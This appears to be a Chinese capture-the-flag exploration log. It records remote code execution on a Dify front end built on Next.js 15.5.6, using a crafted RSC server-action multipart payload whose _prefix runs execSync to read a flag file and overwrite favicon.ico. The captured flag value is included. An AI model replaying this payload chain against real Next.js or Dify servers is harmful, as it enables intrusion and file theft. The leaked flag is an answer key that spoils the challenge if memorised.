# c-03 · 探索记录

对应题解：[`c-03.md`](./c-03-exploration.md)

## 目标与起点

首页跳到 `/apps`，页面资源是 Next.js。先确认产品和版本，再看控制台 API 是不是也在这个端口上。

## 第一阶段：前端版本和没有挂出来的 API

`/apps` 的 HTML 是 Dify。容器里 `/app/web/package.json` 写着 `dify-web` `1.9.2`。`/app/web/node_modules/next/package.json` 的版本是 `15.5.6`。

`GET /console/api/setup` 和 `GET /console/api/version` 都返回同一套 HTML，不是 JSON。Python API 在容器内部的 `127.0.0.1:5001`，这个对外端口没有代理过去。

## 第二阶段：RSC 请求读文件

`POST /apps`，请求头是 `Next-Action: x` 和 `Accept: text/x-component`。multipart 里三个字段分别是带 `_prefix` 的对象、`"$@0"` 和 `[]`。`_prefix` 执行 `cat /challenge/flag.txt`，把输出放进 `x-action-redirect` 的 base64。解码后是 `flag{2bf4ebb2-3613-422c-942d-e5bc2e433488}`。平台接受。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 直接读 `/console/api/setup` | 不是 API | 响应是 Next.js 的 HTML，没有 setup JSON |
| multipart 只有字段 `0` 和 `1` | 命令没执行 | 响应体是 `digest` 数字 `726297884`，没有 `x-action-redirect` |

## 这次真正的收获

对外只有 Dify 的 Next.js 15.5.6。补上第三个表单字段之后，`POST /apps` 会执行 `_prefix`，flag 在 `/challenge/flag.txt`。

---

## 补充：2026-10-27 本轮的卡点

### 500 + `digest` 不代表 payload 结构对

第一版 multipart 字段拼错（每个字段都做了 JSON 编码但字段号/引用对不上），响应是：

```text
0:{"a":"$@1","f":"","b":"BRL18LtYyqLO27fB38GKa"}
1:E{"digest":"2877970050"}
```

`digest` 是异常被折叠后的产物，**没有任何回显**。换 `redirect` 之类的 `_prefix` 也一样 500，
说明问题在**结构**而不在 payload 内容。

### 结构对了以后，客户端一定会超时

用对 6 字段（`0`–`5`）形式后，`curl` 开始 `exit 28`（30 秒无响应）。
最初把它当"没执行"，白试了几轮。

**判据**：用副作用验证，而不是看返回。`process.exit(7)` 打过去，应用仍然 200，说明没死；
`writeFileSync('/app/web/public/favicon.ico','HELLO_MARKER')` 打过去，`GET /favicon.ico`
读到 `HELLO_MARKER`，说明**执行成功**。

### 软 404 会伪造写入成功

`writeFileSync('/app/web/public/z9k.txt', flag)` 之后 `GET /z9k.txt` 返回 **200**，
正文是 SPA 首页 HTML——Next.js 的 catch-all，不是真文件。
只看状态码会以为成功，看正文才发现被回落。

**做法**：验证写文件一律写到**已知会被静态服务**的路径（`favicon.ico`），
并且先写固定标记（`HELLO_MARKER`），确认通道再写真实数据。

### 转机

```text
payload 6 字段（_prefix 在字段 5，_formData.get = $4:constructor:constructor，
_chunks = $2:_response:_chunks，_bundlerConfig = {}）
  -> _prefix = writeFileSync('/app/web/public/favicon.ico', execSync('cat /challenge/flag.txt'))
  -> GET /favicon.ico
```
